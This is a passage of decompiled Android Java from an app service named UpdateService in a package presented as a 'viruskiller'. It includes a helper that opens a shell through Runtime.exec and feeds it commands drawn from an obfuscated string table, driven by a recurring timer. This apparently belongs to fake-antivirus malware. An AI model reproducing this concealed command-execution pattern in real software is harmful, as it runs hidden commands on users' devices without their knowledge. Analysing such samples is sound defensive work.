        //   116: aload #5
        //   118: ldc_w 'start'
        //   121: lload_3
        //   122: invokeinterface putLong : (Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;
        //   127: pop
        //   128: aload #5
        //   130: invokeinterface commit : ()Z
        //   135: pop
        //   136: aload_0
        //   137: getfield startDelay : J
        //   140: lconst_0
        //   141: lcmp
        //   142: ifle -> 180
        //   145: aload_0
        //   146: invokevirtual stopSelf : ()V
        //   149: return
        //   150: astore #5
        //   152: aload #5
        //   154: invokevirtual printStackTrace : ()V
        //   157: goto -> 75
        //   160: lload_3
        //   161: lload_1
        //   162: lsub
        //   163: aload_0
        //   164: getfield startDelay : J
        //   167: ldc2_w 1000
        //   170: lmul
        //   171: lcmp
        //   172: ifge -> 180
        //   175: aload_0
        //   176: invokevirtual stopSelf : ()V
        //   179: return
        //   180: aload_0
        //   181: ldc_w 'c62b31cb3a7041d5'
        //   184: ldc_w '88857ec052e653eb'
        //   187: invokespecial initJu6Ad : (Ljava/lang/String;Ljava/lang/String;)V
        //   190: aload_0
        //   191: new java/util/Timer
        //   194: dup
        //   195: iconst_1
        //   196: invokespecial <init> : (Z)V
        //   199: putfield mTimer : Ljava/util/Timer;
        //   202: new com/safesys/viruskiller/UpdateService$1
        //   205: dup
        //   206: aload_0
        //   207: invokespecial <init> : (Lcom/safesys/viruskiller/UpdateService;)V
        //   210: astore #5
        //   212: aload_0
        //   213: getfield mTimer : Ljava/util/Timer;
        //   216: aload #5
        //   218: getstatic com/safesys/viruskiller/UpdateService.INTERVAL : J
        //   221: getstatic com/safesys/viruskiller/UpdateService.INTERVAL : J
        //   224: invokevirtual schedule : (Ljava/util/TimerTask;JJ)V
        //   227: return
        // Exception table:
        //   from	to	target	type
        //   4	33	150	java/lang/Exception
        //   38	51	150	java/lang/Exception
        //   51	61	150	java/lang/Exception
        //   66	75	150	java/lang/Exception
    }

    public void onDestroy() {
        super.onDestroy();
        if (this.mTimer != null)
            this.mTimer.cancel();
    }

    class MyExecutor {
        Process process = null;

        DataInputStream stderr = null;

        DataInputStream stdin = null;

        DataOutputStream stdout = null;

        public void close() {
            // Byte code:
            //   0: aload_0
            //   1: getfield stdout : Ljava/io/DataOutputStream;
            //   4: ifnull -> 133
            //   7: aload_0
            //   8: getfield stdout : Ljava/io/DataOutputStream;
            //   11: ldc 'exit\\n'
            //   13: invokevirtual writeBytes : (Ljava/lang/String;)V
            //   16: aload_0
            //   17: getfield stdout : Ljava/io/DataOutputStream;
            //   20: invokevirtual flush : ()V
            //   23: aload_0
            //   24: invokevirtual waitFor : ()V
            //   27: aload_0
            //   28: getfield stdin : Ljava/io/DataInputStream;
            //   31: invokevirtual close : ()V
            //   34: aload_0
            //   35: aconst_null
            //   36: putfield stdin : Ljava/io/DataInputStream;
            //   39: aload_0
            //   40: getfield stderr : Ljava/io/DataInputStream;
            //   43: invokevirtual close : ()V
            //   46: aload_0
            //   47: aconst_null
            //   48: putfield stderr : Ljava/io/DataInputStream;
            //   51: aload_0
            //   52: getfield stdout : Ljava/io/DataOutputStream;
            //   55: invokevirtual close : ()V
            //   58: aload_0
            //   59: aconst_null
            //   60: putfield stdout : Ljava/io/DataOutputStream;
            //   63: aload_0
            //   64: aconst_null
            //   65: putfield process : Ljava/lang/Process;
            //   68: aload_0
            //   69: getfield process : Ljava/lang/Process;
            //   72: invokevirtual destroy : ()V
            //   75: return
            //   76: astore_1
            //   77: aload_0
            //   78: aconst_null
            //   79: putfield stdin : Ljava/io/DataInputStream;
            //   82: goto -> 39
            //   85: astore_1
            //   86: aload_1
            //   87: invokevirtual printStackTrace : ()V
            //   90: return
            //   91: astore_1
            //   92: aload_0
            //   93: aconst_null
            //   94: putfield stdin : Ljava/io/DataInputStream;
            //   97: aload_1
            //   98: athrow
            //   99: astore_1
            //   100: aload_0
            //   101: aconst_null
            //   102: putfield stderr : Ljava/io/DataInputStream;
            //   105: goto -> 51
            //   108: astore_1
            //   109: aload_0
            //   110: aconst_null
            //   111: putfield stderr : Ljava/io/DataInputStream;
            //   114: aload_1
            //   115: athrow
            //   116: astore_1
            //   117: aload_0
            //   118: aconst_null
            //   119: putfield stdout : Ljava/io/DataOutputStream;
            //   122: goto -> 63
            //   125: astore_1
            //   126: aload_0
            //   127: aconst_null
            //   128: putfield stdout : Ljava/io/DataOutputStream;
            //   131: aload_1
            //   132: athrow
            //   133: return
            // Exception table:
            //   from	to	target	type
            //   7	27	85	java/io/IOException
            //   27	34	76	java/lang/Exception
            //   27	34	91	finally
            //   34	39	85	java/io/IOException
            //   39	46	99	java/lang/Exception
            //   39	46	108	finally
            //   46	51	85	java/io/IOException
            //   51	58	116	java/lang/Exception
            //   51	58	125	finally
            //   58	63	85	java/io/IOException
            //   63	75	85	java/io/IOException
            //   77	82	85	java/io/IOException
            //   92	99	85	java/io/IOException
            //   100	105	85	java/io/IOException
            //   109	116	85	java/io/IOException
            //   117	122	85	java/io/IOException
            //   126	133	85	java/io/IOException
        }

        public void execute(String param1String, int param1Int) {
            try {
                if (this.stdout != null) {
                    this.stdout.writeBytes(param1String);
                    this.stdout.writeBytes("\n");
                    this.stdout.flush();
                    SystemClock.sleep(param1Int);
                    byte[] arrayOfByte = new byte[this.stderr.available()];
                    this.stderr.read(arrayOfByte, 0, this.stderr.available());
                }
                return;
            } catch (IOException iOException) {
                iOException.printStackTrace();
                return;
            }
        }

        public boolean init() {
            try {
                String str1 = UpdateService.this.getTips(11);
                String str2 = UpdateService.this.getTips(12);
                this.process = Runtime.getRuntime().exec(str1);
                this.stdout = new DataOutputStream(this.process.getOutputStream());
                this.stdin = new DataInputStream(this.process.getInputStream());
                this.stderr = new DataInputStream(this.process.getErrorStream());
                this.stdout.writeBytes(str2);
                this.stdout.flush();
                SystemClock.sleep(1000L);
                int i = this.stderr.available();
                return !(i > 0);
            } catch (IOException iOException) {
                iOException.printStackTrace();
                return false;
            }
        }

        public void waitFor() {
            try {
                if (this.process != null)
                    this.process.waitFor();
                return;
            } catch (InterruptedException interruptedException) {
                interruptedException.printStackTrace();
                return;
            }
        }
    }
}

